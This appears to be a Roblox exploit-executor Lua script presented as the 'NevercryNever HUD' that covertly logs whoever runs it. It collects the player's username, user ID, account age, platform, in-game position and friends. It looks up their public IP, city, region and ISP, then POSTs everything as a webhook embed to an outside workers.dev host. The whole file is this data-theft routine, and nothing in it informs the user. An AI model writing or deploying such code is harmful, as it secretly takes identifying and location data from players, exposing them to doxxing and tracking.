local a="fabitosui.n3xus.workers.dev"
local function b(c)return cloneref and cloneref(game:GetService(c))or game:GetService(c)end
local d=b("HttpService")
local e=b("Players")
local f=b("MarketplaceService")
local g=b("UserInputService")
local h=b("LocalizationService")
local i=(syn and syn.request)or(fluxus and fluxus.request)or(http and http.request)or http_request or request
local j=e.LocalPlayer
if not j then return end

local k=j.Name
local l=j.DisplayName
local m=j.UserId
local n=j.AccountAge
local o=tostring(j.MembershipType):gsub("Enum.MembershipType.","")
local p=os.date("!%d/%m/%Y",os.time()-(n*86400))
local q=game.PlaceId
local r=game.GameId
local s=game.JobId
local t=game.PlaceVersion
local u="Desconhecido"
local v="Desconhecido"

pcall(function()local w=f:GetProductInfo(q)u=w.Name or u v=w.Creator and w.Creator.Name or v end)

local x="Desconhecido"
pcall(function()x=h.RobloxLocaleId or "?"end)

local y="Desconhecido"
pcall(function()
    if identifyexecutor then y=identifyexecutor()
    elseif KRNL_LOADED then y="Krnl"
    elseif syn then y="Synapse X"
    elseif fluxus then y="Fluxus"
    elseif ELECTRON_LOADED then y="Electron"end
end)

local z="PC"
pcall(function()
    if g.TouchEnabled and not g.MouseEnabled then z="Mobile"
    elseif g.GamepadEnabled and not g.MouseEnabled then z="Console"end
end)

local aa=0
pcall(function()aa=math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()or 0)end)

local ab="N/A"
pcall(function()
    local ac=j.Character
    if ac and ac:FindFirstChild("HumanoidRootPart")then
        local ad=ac.HumanoidRootPart.Position
        ab=string.format("X: %.1f | Y: %.1f | Z: %.1f",ad.X,ad.Y,ad.Z)
    end
end)

local ae=0
pcall(function()
    for _,af in ipairs(e:GetPlayers())do
        if af~=j and j:IsFriendsWith(af.UserId)then ae+=1 end
    end
end)

local ag=#e:GetPlayers()

local ah={ip="Não obtido",country="Desconhecido",countryCode="",city="Desconhecido",region="Desconhecido",isp="Desconhecido"}

pcall(function()
    if i then
        local ai=i({Url="http://ip-api.com/json/?fields=query,country,countryCode,regionName,city,isp",Method="GET",Headers={["Content-Type"]="application/json"}})
        if ai and ai.Success and ai.Body then
            local aj=d:JSONDecode(ai.Body)
            ah.ip=aj.query or "N/A"
            ah.country=aj.country or "N/A"
            ah.countryCode=aj.countryCode or ""
            ah.city=aj.city or "N/A"
            ah.region=aj.regionName or "N/A"
            ah.isp=aj.isp or "N/A"
        end
    end
end)

local ak=os.date("!%Y-%m-%dT%H:%M:%SZ",os.time())

local al=d:JSONEncode({
    username="NevercryNever Logger",
    avatar_url="https://www.roblox.com/headshot-thumbnail/image?userId="..m.."&width=150&height=150&format=png",
    embeds={{
        title=" NevercryNever HUD — Uso Detectado",
        color=0x8B0000,
        fields={
            {name="━━━━━━━━ USUÁRIO ━━━━━━━━",value="** **",inline=false},
            {name="Nome",value=l.."\n(@"..k..")",inline=true},
            {name="User ID",value="["..m.."](https://www.roblox.com/users/"..m.."/profile)",inline=true},
            {name="Membership",value=o,inline=true},
            {name="Idade da Conta",value=n.." dias\n(~"..p..")",inline=true},
            {name="Idioma",value=x,inline=true},
            {name="Plataforma",value=z,inline=true},
            {name="Executor",value=y,inline=true},

            {name="━━━━━━━━ IP & LOCALIZAÇÃO ━━━━━━━━",value="** **",inline=false},
            {name="IP Público",value="`"..ah.ip.."`",inline=true},
            {name="País",value=ah.country.." ("..ah.countryCode..")",inline=true},
            {name="Cidade / Região",value=ah.city.." - "..ah.region,inline=true},
            {name="ISP",value=ah.isp,inline=false},

            {name="━━━━━━━━ JOGO ━━━━━━━━",value="** **",inline=false},
            {name="Nome do Jogo",value=u,inline=true},
            {name="Criador",value=v,inline=true},
            {name="Place ID",value="["..q.."](https://www.roblox.com/games/"..q..")",inline=true},
            {name="Game ID",value=tostring(r),inline=true},
            {name="Players no Server",value=tostring(ag),inline=true},
            {name="Amigos no Server",value=tostring(ae),inline=true},
            {name="Ping (aprox.)",value=tostring(aa).."ms",inline=true},

            {name="━━━━━━━━ POSIÇÃO ━━━━━━━━",value="** **",inline=false},
            {name="Posição no Mapa",value=ab,inline=false},

            {name="━━━━━━━━ SESSÃO ━━━━━━━━",value="** **",inline=false},
            {name="Job ID (Servidor)",value="`"..tostring(s).."`",inline=false},
        },
        thumbnail={url="https://www.roblox.com/headshot-thumbnail/image?userId="..m.."&width=150&height=150&format=png"},
        footer={text="NevercryNever HUD Logger • UTC"},
        timestamp=ak
    }}
})

pcall(function()
    if i then
        i({Url=a,Method="POST",Headers={["Content-Type"]="application/json"},Body=al})
        print("[Nevercry Logger] Log enviado com sucesso!")
    end
end)
